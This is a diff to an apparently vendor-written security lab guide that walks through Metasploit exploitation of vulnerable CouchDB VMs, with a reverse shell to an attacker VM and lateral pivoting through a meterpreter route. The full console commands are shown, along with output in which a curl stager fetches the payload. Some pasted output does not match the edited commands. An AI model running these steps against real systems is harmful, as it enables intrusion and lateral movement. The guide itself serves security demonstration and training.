@@ -574,7 +574,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 **Initiate CouchDB Command Execution attack against App1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
-    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
+    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
     * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
     * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
     * Type **exploit** to initiate the exploit and esbalish a command shell
@@ -678,17 +678,23 @@ Process List
 
 6.	Now we can pivot the attack and laterally move to other application VM deployed in the same network segment as **App1-APP-TIER VM**. We will will use the same **apache_couchdb_cmd_exec** exploit to  the **App2-APP-TIER VM** on the internal network, which also is running a vulnerable **CouchDB** Service. 
 
-**Initiate CouchDB Command Execution attack against App2-APP-TIER VM**
+**Initiate CouchDB Command Execution attack against App2-APP-TIER VM through App-1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **background** to move the open meterpreter session to the background.
+    * Type **route add 192.168.20.101/32 3** to route traffic to the **App2-APP-TIER VM** through the previusly established meterpreter session. The IP address specified should be the IP address of the **App2-APP-TIER VM**
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
-    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
+    * Type **set RHOST 192.168.20.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App2-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
     * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
-    * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
+    * Type **set LPORT 4446** to define the local port to use. The reverse shell will be established to this local port
     * Type **exploit** to initiate the exploit and esbalish a command shell
 ```console
-msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
+meterpreter > background
+[*] Backgrounding session 3...
+msf5 post(multi/manage/shell_to_meterpreter) > route add 192.168.20.101/32 3
+[*] Route added
+msf5 post(multi/manage/shell_to_meterpreter) > use exploit/linux/http/apache_couchdb_cmd_exec
 [*] Using configured payload linux/x64/shell_reverse_tcp
-msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.101
 RHOST => 192.168.20.100
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
 LHOST => 10.114.209.151
@@ -696,7 +702,20 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
 LPORT => 4445
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
-
+2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App1-APP-TIER VM** back to the **Extermal VM**
+```console
+[*] Started reverse TCP handler on 10.114.209.151:4445
+[*] Generating curl command stager
+[*] Using URL: http://0.0.0.0:8080/l8sEqcccZNK
+[*] Local IP: http://10.114.209.151:8080/l8sEqcccZNK
+[*] 192.168.20.100:5984 - The 1 time to exploit
+[*] Client 10.114.209.148 (curl/7.38.0) requested /l8sEqcccZNK
+[*] Sending payload to 10.114.209.148 (curl/7.38.0)
+[*] Command shell session 2 opened (10.114.209.151:4445 -> 10.114.209.148:50665) at 2020-07-22 08:48:51 -0500
+[+] Deleted /tmp/jekukcmc
+[+] Deleted /tmp/okmyzfondlujy
+[*] Server stopped.
+```
 
 
 
